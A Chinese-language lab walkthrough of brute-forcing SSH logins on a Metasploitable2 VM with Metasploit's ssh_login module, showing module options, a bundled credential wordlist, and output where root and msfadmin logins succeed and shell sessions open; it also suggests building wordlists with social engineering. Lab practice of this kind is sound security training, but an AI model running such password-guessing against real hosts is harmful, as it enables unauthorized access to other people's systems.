# Metasploit破解ssh登入

## search

查询ssh_login模块 `search ssh_login`

```shell
msf5 auxiliary(sniffer/psnuffle) > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index, for example use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
```

## run

使用`auxiliary/scanner/ssh/ssh_login`模块, 设置相关参数

```shell
msf5 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting     Required  Description
   ----              ---------------     --------  -----------
   BLANK_PASSWORDS   false               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false               no        Add all users in the current database to the list
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS            192.168.80.201      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22                  yes       The target port
   STOP_ON_SUCCESS   false               yes       Stop guessing when a credential works for a host
   THREADS           25                  yes       The number of concurrent threads (max one per host)
   USERNAME                              no        A specific username to authenticate as
   USERPASS_FILE     /root_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false               no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   VERBOSE           true                yes       Whether to print output for all attempts

```

这里使用msf自带的字典对metaspliotable2, root用户进行爆破。

`/usr/share/metasploit-framework/data/wordlists`, 使用root_userpass.txt（文件内）

由于知道root用户密码, 最字典最后添加一行即可。具体字典根据实际情况使用可结合社会工程学。

```shell
[-] 192.168.80.201:22 - Failed: 'root:ibm'
[-] 192.168.80.201:22 - Failed: 'root:monitor'
[-] 192.168.80.201:22 - Failed: 'root:turnkey'
[-] 192.168.80.201:22 - Failed: 'root:vagrant'
[+] 192.168.80.201:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 2 opened (192.168.80.200:43555 -> 192.168.80.201:22) at 2020-09-09 02:32:13 -0400
[+] 192.168.80.201:22 - Success: 'root:123.com' 'uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 3 opened (192.168.80.200:38359 -> 192.168.80.201:22) at 2020-09-09 02:32:14 -0400
```

这里发现msfadmin和root都连接成功。通过`sessions -i`连接ttl
